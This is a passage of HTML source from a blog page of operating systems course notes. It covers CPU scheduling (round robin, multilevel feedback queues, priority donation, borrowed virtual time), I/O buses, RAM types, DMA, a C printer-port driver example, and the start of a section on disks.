        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Preempts job after some time (quantum) and move it to the back of a FIFO&lt;/li&gt;
&lt;li&gt;Disadvantages
&lt;ul&gt;
&lt;li&gt;Context switching
&lt;ul&gt;
&lt;li&gt;Saving and restoring registers&lt;/li&gt;
&lt;li&gt;Switching address spaces&lt;/li&gt;
&lt;li&gt;Cache, buffer cache, &amp;amp; TLB misses&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Slower than FCFS&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;time-quantum&#34; &gt;Time Quantum
&lt;span&gt;
    &lt;a href=&#34;#time-quantum&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;10-100msec&lt;/li&gt;
&lt;li&gt;want larger than context switch cost so that context switching isn&amp;rsquo;t completely suboptimal&lt;/li&gt;
&lt;li&gt;majority of bursts should be less than quantum, otherwise way too much switching&lt;/li&gt;
&lt;li&gt;not too large that it&amp;rsquo;s basically FCFS&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;priority-scheduling&#34; &gt;Priority Scheduling
&lt;span&gt;
    &lt;a href=&#34;#priority-scheduling&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Give a CPU to the process with highest priority&lt;/li&gt;
&lt;li&gt;SJF is priority but using CPU burst time&lt;/li&gt;
&lt;li&gt;Starvation - low priority processes may never execute&lt;/li&gt;
&lt;li&gt;Increase a processors priority as it waits&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;multilevel-feedback-queue&#34; &gt;Multilevel Feedback Queue
&lt;span&gt;
    &lt;a href=&#34;#multilevel-feedback-queue&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Priorities of 0 to 127 and grouped into 32 run queues&lt;/li&gt;
&lt;li&gt;With each queue, run round robin&lt;/li&gt;
&lt;li&gt;Favour interactive jobs&lt;/li&gt;
&lt;li&gt;Run highest priority non-empty queue&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;process-priority&#34; &gt;Process Priority
&lt;span&gt;
    &lt;a href=&#34;#process-priority&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;em&gt;p&lt;sub&gt;nice&lt;/sub&gt;&lt;/em&gt;: user-settable weighting factor&lt;/li&gt;
&lt;li&gt;&lt;em&gt;p&lt;sub&gt;estcpu&lt;/sub&gt;&lt;/em&gt;: per-process CPU usage
&lt;ul&gt;
&lt;li&gt;Incremented whenever timer interrupt found proc. running&lt;/li&gt;
&lt;li&gt;Decayed every second while process runnable
&lt;img class=equation-tall src=&#34;https://latex.codecogs.com/svg.image?p_{estcpu}=\frac{2\times load}{2 \times load + 1}\times p_{estcpu} + p_{nice}&#34;&gt;&lt;/li&gt;
&lt;li&gt;Load is sampled average of length of run queue plus short-term sleep queue over last minute&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Run queue determined by &lt;em&gt;p&lt;sub&gt;usrpri&lt;/sub&gt;&lt;/em&gt; / 4
&lt;img class=equation-tall src=&#34;https://latex.codecogs.com/svg.image?p_{usrpri}=50 + \frac{p_{estcpu}}{4} + 2 \times p_{nice}\leq127&#34;&gt;&lt;/li&gt;
&lt;li&gt;For sleeping threads, update &lt;em&gt;p&lt;sub&gt;estcpu&lt;/sub&gt;&lt;/em&gt; when runnable using &lt;em&gt;p&lt;sub&gt;slptime&lt;/sub&gt;&lt;/em&gt; to avoid unnecessary computes:&lt;/li&gt;
&lt;/ul&gt;
&lt;img class=equation-tall src=&#34;https://latex.codecogs.com/svg.image?p_{estcpu}=\frac{2\times load}{2 \times load + 1}^{p_{slptime}}\times p_{estcpu}&#34;&gt;
&lt;h3 id=&#34;priority-donation&#34; &gt;Priority Donation
&lt;span&gt;
    &lt;a href=&#34;#priority-donation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;If lower priotity has a lock that medium priority wants, then the lower priority has the same priority as the medium.&lt;/p&gt;
&lt;p&gt;If H waits on a lock held by M, then the priotity of M and L both go up, whereas if H waits on just the lock held by L, only L gets a priority bump to H.&lt;/p&gt;
&lt;h3 id=&#34;borrowed-virtual-time-scheduler&#34; &gt;Borrowed Virtual Time Scheduler
&lt;span&gt;
    &lt;a href=&#34;#borrowed-virtual-time-scheduler&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Run process with lowest effective virtual time (E)&lt;/li&gt;
&lt;li&gt;Use weights to get each processes fraction of CPU (seconds per virtual time tick while process has CPU)&lt;/li&gt;
&lt;li&gt;track actual virtual time A&lt;sub&gt;i&lt;/sub&gt; += t / w&lt;sub&gt;i&lt;/sub&gt;&lt;/li&gt;
&lt;li&gt;E&lt;sub&gt;i&lt;/sub&gt; = A&lt;sub&gt;i&lt;/sub&gt; - (warp&lt;sub&gt;i&lt;/sub&gt; ? W&lt;sub&gt;i&lt;/sub&gt; : 0)
&lt;ul&gt;
&lt;li&gt;W&lt;sub&gt;i&lt;/sub&gt; is warp factor (thread precedence)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Run j if E&lt;sub&gt;j&lt;/sub&gt; &amp;lt;= E&lt;sub&gt;i&lt;/sub&gt; - C / w&lt;sub&gt;i&lt;/sub&gt;
&lt;ul&gt;
&lt;li&gt;C is the context switch cost&lt;/li&gt;
&lt;li&gt;Ignore context switch if j has just become runnable to avoid affecting response time&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;BVT example&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://blog.elijahlopez.ca/images/cs-350/bvt-example.webp&#34; alt=&#34;BVT example&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;sleep--wakeup&#34; &gt;Sleep / Wakeup
&lt;span&gt;
    &lt;a href=&#34;#sleep--wakeup&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Increase actual time after wakeup (decreases priority)
&lt;ul&gt;
&lt;li&gt;Otherwise starvation could occur on wakeup&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scheduler Virtual Time (SVT) is the minimum A for all runnable threads&lt;/li&gt;
&lt;li&gt;When waking up a process, set A to max{A_&lt;sub&gt;i&lt;/sub&gt;, SVT}&lt;/li&gt;
&lt;li&gt;Set A when voluntary sleep and not OS&amp;rsquo;s doing (network ping is not OS&amp;rsquo;s doing)&lt;/li&gt;
&lt;li&gt;Processes won&amp;rsquo;t get more than their fair share by using this method&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;real-time-threads&#34; &gt;Real-time Threads
&lt;span&gt;
    &lt;a href=&#34;#real-time-threads&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Some tasks like watching videos, should always be respected when they need CPU, so that&amp;rsquo;s why a Warp factor exists as shown before&lt;/li&gt;
&lt;li&gt;When process i has warp enabled, then as long as it doesn&amp;rsquo;t hold CPU for too long (L&lt;sub&gt;i&lt;/sub&gt;), it&amp;rsquo;s priority for the CPU is boosted when it needs to&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;io&#34; &gt;I/O
&lt;span&gt;
    &lt;a href=&#34;#io&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Realistic PC Architecture&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://blog.elijahlopez.ca/images/cs-350/pc-architecture.webp&#34; alt=&#34;realistic older PC architecture&#34;&gt;&lt;/p&gt;
&lt;p&gt;I/O Bus PCI Example. Peripheral Component Interconnect Express (PCIe).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://blog.elijahlopez.ca/images/cs-350/pci-io-bus.webp&#34; alt=&#34;PCI I/O bus example&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;memory-and-io-buses&#34; &gt;Memory and I/O buses
&lt;span&gt;
    &lt;a href=&#34;#memory-and-io-buses&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;CPU has a bus to the Memory&lt;/li&gt;
&lt;li&gt;Devices have an I/O bus to the Memory&lt;/li&gt;
&lt;li&gt;Devices can appear to be Memory&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;memory-types&#34; &gt;Memory Types
&lt;span&gt;
    &lt;a href=&#34;#memory-types&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;RAM stands for Random Access Memory.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Static RAM (SRAM)
&lt;ul&gt;
&lt;li&gt;4-6 transistors per bit&lt;/li&gt;
&lt;li&gt;very fast, cache slower memory&lt;/li&gt;
&lt;li&gt;two NOT gates&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dynamic RAM (DRAM)
&lt;ul&gt;
&lt;li&gt;1 transistor per bit&lt;/li&gt;
&lt;li&gt;Capacitor + gate (charge indicates value)&lt;/li&gt;
&lt;li&gt;Slower comparator since charge leaks&lt;/li&gt;
&lt;li&gt;Re-write charge after reading&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Video RAM (VRAM)
&lt;ul&gt;
&lt;li&gt;Write and read at the same time (dual ported)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;device-communication&#34; &gt;Device Communication
&lt;span&gt;
    &lt;a href=&#34;#device-communication&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Memory-mapped devices
&lt;ul&gt;
&lt;li&gt;Physical addresses correspond to device registers&lt;/li&gt;
&lt;li&gt;load/store to get status/send instructions&lt;/li&gt;
&lt;li&gt;2&lt;sup&gt;16&lt;/sup&gt; port numbers&lt;/li&gt;
&lt;li&gt;per-range access control not useful&lt;/li&gt;
&lt;li&gt;OS has to map physical to virtual without caching&lt;/li&gt;
&lt;li&gt;physical address assigned at boot&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Device memory
&lt;ul&gt;
&lt;li&gt;OS can write to the device through I/O bus&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Special I/O Instruction
&lt;ul&gt;
&lt;li&gt;Some CPUs have special I/O instructions&lt;/li&gt;
&lt;li&gt;OS can allow user with finer granuality than a page&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DMA (direct memory access)
&lt;ul&gt;
&lt;li&gt;Overlaps unrelated computation with moving data over I/O bus&lt;/li&gt;
&lt;li&gt;Typically then need to “poke” card by writing to device register&lt;/li&gt;
&lt;li&gt;Keep list of buffer locatioons in memory&lt;/li&gt;
&lt;li&gt;use the CPU only to transfer control, not for data transfer&lt;/li&gt;
&lt;li&gt;Network Interface Card (NIC)
&lt;ul&gt;
&lt;li&gt;Bus interface logic uses memory to move packets to and from buffers in main memory&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Steps
&lt;ol&gt;
&lt;li&gt;Tell device driver to transfer data to buffer at address X&lt;/li&gt;
&lt;li&gt;Driver tells device controller to transfer bytes to buffer X&lt;/li&gt;
&lt;li&gt;DMA transfer initiated for bytes C until C = 0; memory address increases and C decreases&lt;/li&gt;
&lt;li&gt;DMA interrupts CPU to signal completion&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;driver-architecture&#34; &gt;Driver Architecture
&lt;span&gt;
    &lt;a href=&#34;#driver-architecture&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Entry points provided to kernel: Reset, ioctl, output, interrupt, read, write, strategy&lt;/li&gt;
&lt;li&gt;Need to synchronise
&lt;ul&gt;
&lt;li&gt;Polling sucks because either CPU is blocked or high latency&lt;/li&gt;
&lt;li&gt;Card should interrupt CPU
&lt;ul&gt;
&lt;li&gt;CPU asks card what occured&lt;/li&gt;
&lt;li&gt;High network packet arrival rate can prevent progress = mix of both&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;sendbyte&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt; byte) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Wait until BSY bit is 1. */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; ((&lt;span style=&#34;color:#447fcf&#34;&gt;inb&lt;/span&gt; (&lt;span style=&#34;color:#3677a9&#34;&gt;0x379&lt;/span&gt;) &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0x80&lt;/span&gt;) == &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#447fcf&#34;&gt;delay&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Put the byte we wish to send on pins D7-0. */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;outb&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0x378&lt;/span&gt;, byte);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Pulse STR (strobe) line to inform the printer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;  * that a byte is available */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt; ctrlval = &lt;span style=&#34;color:#447fcf&#34;&gt;inb&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0x37a&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;outb&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0x37a&lt;/span&gt;, ctrlval | &lt;span style=&#34;color:#3677a9&#34;&gt;0x01&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;delay&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;outb&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0x37a&lt;/span&gt;, ctrlval);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;disks-io-subtopic&#34; &gt;Disks (I/O Subtopic)
&lt;span&gt;
    &lt;a href=&#34;#disks-io-subtopic&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Stack of magnetic platters
&lt;ul&gt;
&lt;li&gt;Each platter is divided into &lt;a href=&#34;https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/WA_80_cm_archery_target.svg/1200px-WA_80_cm_archery_target.svg.png&#34;&gt;&lt;em&gt;concentric&lt;/em&gt;&lt;/a&gt; tracks and each track has sectors&lt;/li&gt;
&lt;li&gt;A stack of tracks with a fixed raidus is called a cylinder&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Disk arm assembly
&lt;ul&gt;
&lt;li&gt;Arms rotate around pivot, all move together&lt;/li&gt;
&lt;li&gt;Arms contain disk heads–one for each cylinder&lt;/li&gt;
&lt;li&gt;Heads read and write data to platters&lt;/li&gt;
&lt;li&gt;One head active at a time&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://blog.elijahlopez.ca/images/cs-350/disk-anatomy.webp&#34; alt=&#34;disk anatomy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;disk-positioning-system&#34; &gt;Disk Positioning System
&lt;span&gt;
    &lt;a href=&#34;#disk-positioning-system&#34;&gt;
